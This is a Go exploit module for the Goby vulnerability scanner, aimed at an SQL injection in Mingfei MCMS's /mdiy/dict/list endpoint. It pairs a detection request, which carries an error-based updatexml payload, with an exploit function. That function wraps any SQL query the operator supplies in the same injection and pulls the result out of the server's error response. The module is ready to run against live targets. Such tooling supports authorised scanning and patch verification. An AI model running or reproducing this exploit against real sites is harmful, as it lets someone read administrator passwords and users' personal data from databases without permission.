package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Mingfei CMS /mdiy/dict/list dictType parameter SQL Injection Vulnerability",
    "Description": "<p>MCMS is a set of lightweight open source content management system developed based on java. It is simple, safe, open source and free. It can run on Linux, Windows, MacOSX, Solaris and other platforms. The system has an sql injection vulnerability before the 5.2.10 version. You can use this vulnerability to obtain sensitive information</p>",
    "Product": "MCMS",
    "Homepage": "https://gitee.com/mingSoft/MCMS",
    "DisclosureDate": "2024-04-15",
    "Author": "kkker",
    "FofaQuery": "body=\"铭飞MCMS\" || body=\"/mdiy/formData/save.do\" || body=\"static/plugins/ms/1.0.0/ms.js\" || body=\"/ms-mcms/template\" ||  body=\"mingsoft.net\" || body=\"store.mingsoft.net\"",
    "GobyQuery": "body=\"铭飞MCMS\" || body=\"/mdiy/formData/save.do\" || body=\"static/plugins/ms/1.0.0/ms.js\" || body=\"/ms-mcms/template\" ||  body=\"mingsoft.net\" || body=\"store.mingsoft.net\"",
    "Level": "2",
    "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://gitee.com/mingSoft/MCMS/\">https://gitee.com/mingSoft/MCMS/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "sql",
            "type": "input",
            "value": "select user()",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/mdiy/dict/list?dict=c&dictType=%E6%96%87%E7%AB%A0%E5%B1%9E%E6%80%A7&orderBy=0%20or%20updatexml(1,concat(0x7e,(SELECT%20md5(233)),0x7e),1)",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "e165421110ba03099a1c0393373c5b4",
                        "bz": ""
                    },
                    {
                        "type": "group",
                        "operation": "OR",
                        "checks": [
                            {
                                "type": "item",
                                "variable": "$code",
                                "operation": "==",
                                "value": "200",
                                "bz": ""
                            },
                            {
                                "type": "item",
                                "variable": "$code",
                                "operation": "==",
                                "value": "500",
                                "bz": ""
                            }
                        ]
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "铭飞 CMS /mdiy/dict/list dictType 参数 SQL 注入漏洞",
            "Product": "MCMS",
            "Description": "<p>铭飞CMS是一款基于java开发的一套轻量级开源内容管理系统,铭飞CMS简洁、安全、开源、免费,可运行在Linux、Windows、MacOSX、Solaris等各种平台上,专注为公司企业、个人站长快速建站提供解决方案, 该系统 /mdiy/dict/list 接口存在 sql 注入漏洞，能够利用该漏洞获取敏感信息<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://gitee.com/mingSoft/MCMS/\">https://gitee.com/mingSoft/MCMS/</a><br></p>",
            "Impact": "<p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Mingfei CMS /mdiy/dict/list dictType parameter SQL Injection Vulnerability",
            "Product": "MCMS",
            "Description": "<p>MCMS is a set of lightweight open source content management system developed based on java. It is simple, safe, open source and free. It can run on Linux, Windows, MacOSX, Solaris and other platforms. The system has an sql injection vulnerability before the 5.2.10 version. You can use this vulnerability to obtain sensitive information</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://gitee.com/mingSoft/MCMS/\">https://gitee.com/mingSoft/MCMS/</a><br></p>",
            "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2024-04-17",
    "PocId": "10942"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			sqlQuery := ss.Params["sql"]
			url := "/mdiy/dict/list?dict=c&dictType=%E6%96%87%E7%AB%A0%E5%B1%9E%E6%80%A7&orderBy=0%20or%20updatexml(1,concat(0x7e,(" + url.QueryEscape(sqlQuery.(string)) + "),0x7e),1)"
			cfg := httpclient.NewGetRequestConfig(url)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0")
			re := regexp.MustCompile(`~(.*?)~`)
			resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg)
			if err == nil {
				if (resp.StatusCode == 200 || resp.StatusCode == 500) && strings.Contains(resp.RawBody, "~") {
					result := re.FindAllString(resp.RawBody, -1)
					expResult.Output = "result:" + result[1] + "\n"
					expResult.Output += "请求包：\n"
					expResult.Output += cfg.Method
					expResult.Output += cfg.URI
					expResult.Success = true
					return expResult
				}
			}

			expResult.Success = false
			return expResult
		},
	))
}
